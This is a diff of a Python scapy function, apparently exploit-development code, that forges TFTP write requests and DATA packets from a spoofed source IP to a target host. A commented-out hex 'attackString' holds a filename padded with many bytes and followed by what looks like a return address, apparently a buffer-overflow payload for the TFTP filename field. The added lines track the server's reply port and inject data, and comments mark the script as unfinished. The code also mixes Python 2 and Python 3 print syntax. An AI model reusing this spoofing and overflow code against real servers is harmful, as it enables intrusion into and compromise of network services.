@@ -11,8 +11,9 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
 
     #attackString = bytearray.fromhex("6c 6d 63 6f 64 65 6d 6f 2e 68 74 6d 2e 73 69 67 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c  6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c e0 6d 1b c0 ec c8 01 c0 00").decode()
 
-    a = scapy.IP(src=hostIP,dst=targetIP)
-    b = a/scapy.UDP(sport=scapy.RandShort(),dport=TFTPPort)
+    basic_pkt = scapy.IP(src=hostIP,dst=targetIP)
+    sport=scapy.RandShort()
+    b = basic_pkt/scapy.UDP(sport=sport,dport=TFTPPort)
     c = b/scapy.TFTP(op=2)
 
     # Send something friendly for now.
@@ -23,8 +24,27 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     print (d)
     print ("Sending...")
     r = scapy.sr1(d, timeout=3, verbose=True)
+
+    r[UDP].dport = TFTPPort
+    r = r.__class__(str(r))
+    if TFTP_ERROR in r:
+        print r[TFTP_ERROR].errormsg
+        sys.exit(0)
     print ("Response is")
     print (r)
+
+    dport = r[UDP].sport
+    print ("Target DATA port is")
+    print (dport)
+    print ("Source DATA port is")
+    print (sport)
+
+    DATA=basic_pkt/UDP(sport=sport, dport=dport)/TFTP(op=3)/TFTP_DATA(block=1)/Raw(load="this is a test")
+    r2 = scapy.sr1(DATA, timeout=3, verbose=True)
+    r2 = r2.__class__(str(r2))
+    print ("Response2 is")
+    print (r2)
+
     # Much more to do here ..
     #  check r
     #  forge and send a DATA packet
